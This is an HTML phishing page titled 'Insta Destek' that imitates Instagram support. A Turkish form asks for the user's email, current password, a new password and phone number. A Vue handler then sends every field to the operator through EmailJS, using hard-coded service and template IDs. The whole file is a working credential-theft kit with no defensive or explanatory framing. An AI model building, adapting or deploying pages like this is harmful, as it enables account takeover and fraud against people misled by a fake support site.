<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insta Destek</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
        #app {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0077cc;
        }
    </style>
</head>
<body>
    <div id="app">
        <form @submit.prevent="sendEmail">
            <h2>Bilgileriniz</h2>
            <input type="email" v-model="email" placeholder="Email" required>
            <input type="password" v-model="password" placeholder="Sifre" required>
            <input type="password" v-model="newPassword" placeholder="Yeni Sifre" required>
            <input type="tel" v-model="phone" placeholder="Telefon" required>
            <button type="submit">Gonder</button>
        </form>
    </div>

    <script>
        const { createApp } = Vue;

        createApp({
            data() {
                return {
                    email: '',
                    password: '',
                    newPassword: '',
                    phone: ''
                };
            },
            mounted() {
                emailjs.init("ghChkcyiWEAvdB9v6"); // Replace with your EmailJS public key
            },
            methods: {
                sendEmail() {
                    const templateParams = {
                        email: this.email,
                        password: this.password,
                        newPassword: this.newPassword,
                        phone: this.phone
                    };

                    emailjs.send("service_sn9ffyy", "template_vz0ecpr", templateParams)
                        .then(response => {
                            alert("Email sent successfully!");
                        })
                        .catch(error => {
                            console.error("Error sending email:", error);
                        });
                }
            }
        }).mount('#app');
    </script>
</body>
</html>
